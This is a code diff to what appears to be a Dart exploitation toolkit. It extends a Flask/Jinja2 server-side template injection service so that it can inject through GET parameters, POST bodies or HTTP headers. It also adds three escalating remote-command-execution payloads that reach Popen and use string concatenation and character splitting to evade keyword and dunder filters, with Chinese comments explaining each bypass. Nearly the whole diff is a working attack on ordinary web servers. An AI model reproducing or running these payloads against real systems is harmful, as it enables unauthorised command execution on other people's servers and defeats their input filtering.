@@ -337,14 +337,24 @@ class ElasticsearchExpService {
   }
 }
 
+enum SstiInjectMode { get, post, header }
+
 class FlaskSstiExpService {
   final String baseUrl;
   final String paramName;
+  final SstiInjectMode injectMode;
+  /// 额外请求头，每次请求都会带上
+  final Map<String, String> extraHeaders;
+  /// 原始请求体模板，{{INJECT}} 占位符会被替换为实际 payload
+  final String rawBody;
   final Duration timeout;
 
   FlaskSstiExpService({
     required this.baseUrl,
     this.paramName = 'name',
+    this.injectMode = SstiInjectMode.get,
+    this.extraHeaders = const {},
+    this.rawBody = '',
     this.timeout = const Duration(seconds: 10),
   });
 
@@ -352,10 +362,46 @@ class FlaskSstiExpService {
       ? baseUrl.substring(0, baseUrl.length - 1)
       : baseUrl;
 
+  Future<http.Response> _send(String payload) {
+    final baseUri = Uri.parse('$_base/');
+    final headers = Map<String, String>.from(extraHeaders);
+
+    switch (injectMode) {
+      case SstiInjectMode.get:
+        return http
+            .get(
+              Uri.parse('$_base/?$paramName=${Uri.encodeComponent(payload)}'),
+              headers: headers,
+            )
+            .timeout(timeout);
+
+      case SstiInjectMode.post:
+        final body = rawBody.isNotEmpty
+            ? rawBody.replaceAll('{{INJECT}}', payload)
+            : '$paramName=${Uri.encodeComponent(payload)}';
+        if (!headers.keys.any((k) => k.toLowerCase() == 'content-type')) {
+          final trimmed = rawBody.trimLeft();
+          headers['Content-Type'] =
+              (trimmed.startsWith('{') || trimmed.startsWith('['))
+                  ? 'application/json'
+                  : 'application/x-www-form-urlencoded';
+        }
+        return http
+            .post(baseUri, headers: headers, body: body)
+            .timeout(timeout);
+
+      case SstiInjectMode.header:
+        // {{INJECT}} 占位符替换 header 值
+        for (final key in headers.keys.toList()) {
+          headers[key] = headers[key]!.replaceAll('{{INJECT}}', payload);
+        }
+        return http.get(baseUri, headers: headers).timeout(timeout);
+    }
+  }
+
   Future<ExpResult> check() async {
     try {
-      final url = '$_base/?$paramName={{233*233}}';
-      final res = await http.get(Uri.parse(url)).timeout(timeout);
+      final res = await _send('{{233*233}}');
       if (res.body.contains('54289')) {
         return ExpResult(
           true,
@@ -367,15 +413,62 @@ class FlaskSstiExpService {
     return const ExpResult(false, 'Flask/Jinja2 SSTI', '');
   }
 
+  // 将字符串拆成 Jinja2 字符级拼接，绕过命令关键字过滤
+  // 例: "id" → "'i'~'d'"
+  static String _j2Split(String s) {
+    return s.split('').map((c) {
+      final e = c == "'" ? "\\'" : c == '\\' ? '\\\\' : c;
+      return "'$e'";
+    }).join('~');
+  }
+
+  static const _sentinel = 'SSTI_OUT';
+
+  // 从响应中提取哨兵标记之间的内容
+  static String? _extract(String body) {
+    final start = body.indexOf('${_sentinel}_S');
+    final end = body.indexOf('${_sentinel}_E');
+    if (start == -1 || end == -1 || end <= start) return null;
+    return body.substring(start + '${_sentinel}_S'.length, end).trim();
+  }
+
+  // 用哨兵标记包裹 RCE 表达式，精确提取命令输出，过滤模板噪声
+  String _wrap(String expr) => '${_sentinel}_S{{$expr}}${_sentinel}_E';
+
   Future<String?> execRce(String cmd) async {
-    try {
-      final payload =
-          "{{request.application.__globals__.__builtins__.__import__('os').popen('$cmd').read()}}";
-      final url = '$_base/?$paramName=${Uri.encodeComponent(payload)}';
-      final res = await http.get(Uri.parse(url)).timeout(timeout);
-      return res.body.isNotEmpty ? res.body : null;
-    } catch (_) {
-      return null;
+    final splitCmd = _j2Split(cmd);
+
+    // 三层递进 payload，兼容不同强度的关键字过滤：
+    // 1. 直接执行（无过滤）
+    // 2. |attr()+字符串拼接绕过 __dunder__ 属性过滤
+    // 3. 在 2 的基础上额外绕过 Popen/shell/communicate/decode/stdout 关键字，
+    //    命令本身也做字符级拆分
+    final payloads = [
+      "{% for c in ''.__class__.__mro__[1].__subclasses__() %}"
+          "{% if c.__name__ == 'Popen' %}"
+          "${_wrap("c('$cmd',shell=True,stdout=-1).communicate()[0].decode()")}"
+          "{% endif %}{% endfor %}",
+      "{%set d='_'*2%}"
+          "{%for c in ''|attr(d+'class'+d)|attr(d+'mro'+d)|last|attr(d+'subclasses'+d)()%}"
+          "{%if c|attr(d+'name'+d)=='Popen'%}"
+          "${_wrap("c('$cmd',shell=True,stdout=-1).communicate()[0].decode()")}"
+          "{%endif%}{%endfor%}",
+      "{%set d='_'*2%}"
+          "{%for c in ''|attr(d+'class'+d)|attr(d+'mro'+d)|last|attr(d+'subclasses'+d)()%}"
+          "{%if c|attr(d+'name'+d)==('Po'+'pen')%}"
+          "${_wrap("c(['sh','-c',$splitCmd],-1,None,None,-1)|attr('commun'+'icate')()|first|attr('dec'+'ode')()")}"
+          "{%endif%}{%endfor%}",
+    ];
+
+    for (final payload in payloads) {
+      try {
+        final res = await _send(payload);
+        if (res.statusCode == 200) {
+          final out = _extract(res.body);
+          if (out != null) return out;
+        }
+      } catch (_) {}
     }
+    return null;
   }
 }
